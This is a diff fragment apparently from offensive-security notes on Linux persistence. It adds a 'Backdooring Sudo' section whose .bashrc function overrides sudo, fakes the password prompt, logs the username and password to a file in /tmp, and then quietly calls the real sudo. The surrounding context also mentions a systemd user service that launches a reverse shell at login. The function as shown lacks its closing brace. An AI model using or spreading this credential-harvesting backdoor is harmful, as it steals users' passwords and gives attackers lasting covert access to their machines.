@@ -36,6 +36,19 @@ systemctl --user start persistence.service
 
 On the next user login systemd will happily start a reverse shell.
 
+## Backdooring Sudo:
+
+Add to ```.bashrc```
+
+```bash
+function sudo() {
+    realsudo="$(which sudo)"
+    read -s -p "[sudo] password for $USER: " inputPasswd
+    printf "\n"; printf '%s\n' "$USER : $inputPasswd\n" >> /tmp/log13999292.log
+    $realsudo -S <<< "$inputPasswd" -u root bash -c "exit" > /dev/null 2>&1
+    $realsudo "${@:1}"
+```
+
 ## One Liner to Add Persistence on a Box via Sudoers File:
 
 ```
